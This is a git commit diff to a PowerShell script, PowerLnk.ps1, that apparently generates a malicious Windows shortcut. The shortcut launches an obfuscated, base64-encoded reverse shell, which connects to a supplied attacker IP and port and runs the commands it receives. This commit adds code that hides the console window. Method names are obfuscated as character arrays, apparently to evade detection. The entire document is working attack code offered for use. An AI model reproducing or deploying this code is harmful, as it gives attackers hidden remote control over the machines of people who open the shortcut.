f365e0a08bc7643adadc51da917f4394503449eb
john-xor <61298039+john-xor@users.noreply.github.com>
2022-12-04 14:25:56 -0900

    Update PowerLnk.ps1
    added capes to auto hide the window

--- PowerLnk.ps1
+++ PowerLnk.ps1
@@ -1,7 +1,8 @@
-﻿param([string]$ip,[string]$port)
+param([string]$ip,[string]$port)
 
 #oneliner rev shell
 $code=@'
+Add-Type -name y -names x -m '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr a, Int32 b);';[x.y]::ShowWindow([x.y]::GetConsoleWindow(), 0)
 $x=(New-Object System.Net.Sockets.TCPClient("~",^)).getstream();[byte[]]$b=0..65535|%{0};while(($i=$x.Read($b,0,$b.Length))-ne 0){$d=([text.encoding]::ASCII).GetBytes(((i''ex((New-Object -t System.Text.ASCIIEncoding).GetString($b,0,$i))2>&1|Out-String)+(pwd).Path+"> "));$x.Write($d,0,$d.Length);$x.Flush()}
 '@ -replace '~',$ip -replace '\^',$port
 
@@ -19,7 +20,3 @@ $Shortcut.TargetPath = "powershell"
 $Shortcut.Arguments = ("[System.Text.Encoding]::([char[]](97,83,99,105,73)-join'').([char[]](103,69,84,115,116,82,73,110,103)-join'')([System.Convert]::([char[]](102,82,111,77,98,65,115,69,54,52,115,84,114,73,78,103)-join'')('"+$b64+"'))|powershell")
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
-
-
-
-
